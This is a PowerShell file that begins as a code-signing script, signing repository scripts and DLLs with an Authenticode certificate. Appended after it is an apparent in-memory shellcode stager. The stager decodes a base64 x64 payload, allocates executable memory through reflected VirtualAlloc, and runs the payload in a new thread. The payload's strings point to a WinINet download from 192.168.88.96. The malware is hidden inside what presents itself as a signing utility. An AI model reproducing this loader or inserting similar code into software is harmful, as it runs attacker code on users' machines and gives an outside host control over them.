param($Thumbprint)
$ErrorActionPreference = 'Stop'

$cert = Get-ChildItem Cert:\CurrentUser\My |
Where-Object Thumbprint -eq $Thumbprint

if ($null -eq $cert) {
    throw "No certificate was found."
}

if (@($cert).Length -gt 1) {
    throw "More than one cerfificate with the given thumbprint was found."
}

"Signing Files"
$files = Get-ChildItem -Recurse -ErrorAction SilentlyContinue |
Where-Object { $_.Extension -in ".ps1", ".psm1", ".psd1", ".ps1xml", ".dll" } |
Select-Object -ExpandProperty FullName

$incorrectSignatures = Get-AuthenticodeSignature -FilePath $files | Where-Object { "Valid", "NotSigned" -notcontains $_.Status }
if ($incorrectSignatures) {
    throw "There are items in the repository that are signed but their signature is invalid, review:`n$($incorrectSignatures | Out-String)`n"
}

$filesToSign = $files | Where-Object { "NotSigned" -eq (Get-AuthenticodeSignature -FilePath $_ ).Status }

if (-not @($filesToSign)) {
    return "There are no files to sign, all the files in the repository are already signed."
}

$results = $filesToSign |
ForEach-Object {
    $r = Set-AuthenticodeSignature $_ -Certificate $cert -TimestampServer 'http://timestamp.digicert.com' -ErrorAction Stop
    $r | Out-String | Write-Host
    $r
}

$failed = $results | Where-Object { $_.Status -ne "Valid" }

if ($failed) {
    throw "Failed signing $($failed.Path -join "`n")"
}
Set-StrictMode -Version 2

function func_get_proc_address {
	Param ($var_module, $var_procedure)		
	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $var_unsafe_native_methods.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($var_unsafe_native_methods.GetMethod('GetModuleHandle')).Invoke($null, @($var_module)))), $var_procedure))
}

function func_get_delegate_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameters,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)
	
	$var_type_builder = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type_builder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameters).SetImplementationFlags('Runtime, Managed')
	$var_type_builder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameters).SetImplementationFlags('Runtime, Managed')
	
	return $var_type_builder.CreateType()
}

If ([IntPtr]::size -eq 8) {
	[Byte[]]$var_code = [System.Convert]::FromBase64String("/EiD5PDoyAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwJ1couAiAAAAEiFwHRnSAHQUItIGESLQCBJAdDjVkj/yUGLNIhIAdZNMclIMcCsQcHJDUEBwTjgdfFMA0wkCEU50XXYWESLQCRJAdBmQYsMSESLQBxJAdBBiwSISAHQQVhBWF5ZWkFYQVlBWkiD7CBBUv/gWEFZWkiLEulP////XWoASb53aW5pbmV0AEFWSYnmTInxQbpMdyYH/9XogAAAAE1vemlsbGEvNS4wIChjb21wYXRpYmxlOyBNU0lFIDkuMDsgV2luZG93cyBOVCA2LjA7IFdPVzY0OyBUcmlkZW50LzUuMCkAWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFgAWUgx0k0xwE0xyUFQQVBBujpWeaf/1ethWkiJwUG4eCMAAE0xyUFRQVFqA0FRQbpXiZ/G/9XrREiJwUgx0kFYTTHJUmgAAmCEUlJBuutVLjv/1UiJxmoKX0iJ8Ugx0k0xwE0xyVJSQbotBhh7/9WFwHUdSP/PdBDr3+tj6Lf///8vTVpsSgAAQb7wtaJW/9VIMcm6AABAAEG4ABAAAEG5QAAAAEG6WKRT5f/VSJNTU0iJ50iJ8UiJ2kG4ACAAAEmJ+UG6EpaJ4v/VSIPEIIXAdLZmiwdIAcOFwHXXWFjD6DX///8xOTIuMTY4Ljg4Ljk2AA==")
	
	$var_buffer = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $var_code.Length,0x3000, 0x40)
	[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)

	$var_hthread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll CreateThread), (func_get_delegate_type @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$var_buffer,[IntPtr]::Zero,0,[IntPtr]::Zero)
	[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WaitForSingleObject), (func_get_delegate_type @([IntPtr], [Int32]))).Invoke($var_hthread,0xffffffff) | Out-Null
}

